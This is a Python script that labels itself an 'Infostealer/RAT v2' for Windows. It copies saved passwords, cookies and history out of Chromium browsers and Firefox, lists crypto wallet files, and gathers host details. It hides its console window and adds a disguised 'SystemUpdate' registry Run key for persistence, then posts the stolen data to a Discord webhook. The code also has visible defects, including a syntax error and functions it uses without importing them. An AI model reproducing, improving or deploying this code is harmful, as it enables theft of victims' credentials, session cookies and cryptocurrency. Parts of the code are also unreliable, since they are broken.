import os
import sys
import socket
import subprocess
import sqlite3
import json
import zipfile
import shutil
import glob
import time
import platform
import psutil
import requests
import winreg
from pathlib import Path
from urllib.request import urlopen, Request
from urllib.error import URLError
from PIL import Image
import io

# --- Configuration ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1546874268149620806/GqZUiOIUuBrvSpPaEDskbdCt6yEijqlI82Ys1YtAjv818kkywiI9Pl6bCnUX5xPJ8vbp"  # Replace with your webhook

def ensure_dependencies():
    """Install missing dependencies."""
    deps = ["requests", "pyautogui", "pynput", "pillow"]
    for dep in deps:
        try:
            __import__(dep)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", dep])

def get_ip():
    try:
        ip = urlopen(Request('https://api.ipify.org', method='GET')).read().decode()
        return ip
    except:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"

def get_system_info():
    info = {
        "ip": get_ip(),
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": os.getenv('USERNAME'),
        "architecture": platform.machine(),
        "installed_software": [],
        "drives": []
    }
    
    # Get installed software
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall", 0, winreg.KEY_READ)
        i = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name, 0, winreg.KEY_READ)
                try:
                    display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    if display_name:
                        info["installed_software"].append(display_name)
                except FileNotFoundError:
                    pass
                winreg.CloseKey(subkey)
                i += 1
            except OSError:
                break
    except Exception as e:
        info["installed_software"].append(f"Error: {e}")

    # Get drives
    for drive in psutil.disk_partitions():
        info["drives"].append(f"{drive.device} ({drive.mountpoint})")

    return info

def get_chrome_data(browser_name, vendor):
    """Generic function to get data from Chromium-based browsers."""
    user_data_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", vendor, browser_name, "User Data")
    if not os.path.exists(user_data_path):
        return {}
    
    data = {}
    
    # Passwords
    login_data_path = os.path.join(user_data_path, "Default", "Login Data")
    if os.path.exists(login_data_path):
        temp_login = os.path.join(os.environ['TEMP'], f"temp_{browser_name}_login.db")
        shutil.copy2(login_data_path, temp_login)
        try:
            conn = sqlite3.connect(temp_login)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            passwords = cursor.fetchall()
            data["passwords"] = [{"url": row[0], "user": row[1], "password": row[2].decode('utf-8', errors='ignore') if isinstance(row[2], bytes) else row[2]} for row in passwords]
            conn.close()
        except:
            pass
        finally:
            if os.path.exists(temp_login):
                os.remove(temp_login)

    # Cookies
    cookies_path = os.path.join(user_data_path, "Default", "Cookies")
    if os.path.exists(cookies_path):
        temp_cookies = os.path.join(os.environ['TEMP'], f"temp_{browser_name}_cookies.db")
        shutil.copy2(cookies_path, temp_cookies)
        try:
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value, host_key FROM cookies")
            cookies = cursor.fetchall()
            data["cookies"] = [{"name": row[0], "value": row[1], "host": row[2]} for row in cookies]
            conn.close()
        except:
            pass
        finally:
            if os.path.exists(temp_cookies):
                os.remove(temp_cookies)

    # History
    history_path = os.path.join(user_data_path, "Default", "History")
    if os.path.exists(history_path):
        temp_history = os.path.join(os.environ['TEMP'], f"temp_{browser_name}_history.db")
        shutil.copy2(history_path, temp_history)
        try:
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count FROM urls")
            history = cursor.fetchall()
            data["history"] = [{"url": row[0], "title": row[1], "visits": row[2]} for row in history]
            conn.close()
        except:
            pass
        finally:
            if os.path.exists(temp_history):
                os.remove(temp_history)

    return data

def get_firefox_data():
    """Extract data from Firefox."""
    profile_path = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(profile_path):
        return {}
    
    data = {}
    for profile in os.listdir(profile_path):
        if profile.endswith(".default-release") or profile.endswith(".default"):
            profile_path = os.path.join(profile_path, profile)
            logins_json = os.path.join(profile_path, "logins.json")
            cookies_json = os.path.join(profile_path, "cookies.json")
            
            if os.path.exists(logins_json):
                try:
                    with open(logins_json, 'r') as f:
                        logins = json.load(f)
                        data["passwords"] = [{"url": l["hostname"], "user": l["login"], "password": l["password"]} for l in logins.get("logins", [])]
                except:
                    pass
            
            if os.path.exists(cookies_json):
                try:
                    with open(cookies_json, 'r') as f:
                        cookies = json.load(f)
                        data["cookies"] = [{"host": c["host"], "name": c["name"], "value": c["value"]} for c in cookies]
                except:
                    pass
                    
    return data

def get_wallets():
    """Check for crypto wallets."""
    wallets = []
    wallet_paths = [
        "AppData\\Roaming\\Bitcoin\\wallet.dat",
        "AppData\\Roaming\\Litecoin\\wallet.dat",
        "AppData\\Roaming\\Ethereum\\keystore",
        "AppData\\Roaming\\Monero\\wallets",
        "AppData\\Roaming\\Zcash\\wallets",
        "AppData\\Roaming\\Dash\\wallets",
        "AppData\\Roaming\\XMR\\wallets",
        "AppData\\Roaming\\TronLink\\wallets",
        "AppData\\Roaming\\MetaMask\\keystores"
    ]
    for wallet in wallet_paths:
        full_path = os.path.join(os.environ['USERPROFILE'], wallet)
        if os.path.exists(full_path):
            wallets.append(full_path)
    return wallets

def take_screenshot():
    """Take a screenshot and return as base64."""
    try:
        img = ImageGrab.grab()
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        return base64.b64encode(buffer.getvalue()).decode('utf-8')
    except:
        return None

def execute_command(cmd):
    """Execute a command and return the output."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def setup_persistence():
    """Add to registry for persistence."""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except:
        pass

def hide_process():
    """Hide the process from Task Manager."""
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def main():
    print("[+] Infostealer/RAT v2 initialized.")
    ensure_dependencies()
    hide_process()
    setup_persistence()
    
    # Collect Data
    system_info = get_system_info()
    browsers = ["Chrome", "Edge", "Brave", "Opera", "Vivaldi"]
    vendors = ["Google", "Microsoft", "Brave", "Opera", "Opera"]
    browser_data = {}
    for b, v in zip(browsers, vendors):
        browser_data.update(get_chrome_data(b, v))
    
    firefox_data = get_firefox_data()
    wallets = get_wallets()
    
    # Format Message
    message = f"**Infostealer Report**\n"
    message += f"**Host:** {system_info['hostname']}\n"
    message += f"**IP:** {system_info['ip']}\n"
    message += f**OS:** {system_info['os']}\n"
    message += f"**User:** {system_info['user']}\n"
    message += f"**Drives:** {', '.join(system_info['drives'])}\n\n"
    
    message += "**Passwords:**\n"
    for browser, data in browser_data.items():
        if "passwords" in data:
            for p in data["passwords"]:
                message += f"[{browser}] {p['url']} | {p['user']} | {p['password']}\n"
    
    message += "\n**Cookies:**\n"
    for browser, data in browser_data.items():
        if "cookies" in data:
            for c in data["cookies"]:
                message += f"[{browser}] {c['host']} | {c['name']} | {c['value']}\n"
                
    message += "\n**Wallets Found:**\n"
    for w in wallets:
        message += f"{w}\n"
        
    # Send to Discord
    try:
        requests.post(WEBHOOK_URL, json={"content": message})
        print("[+] Sent to Discord.")
    except Exception as e:
        print(f"[-] Error sending: {e}")

if __name__ == "__main__":
    main()
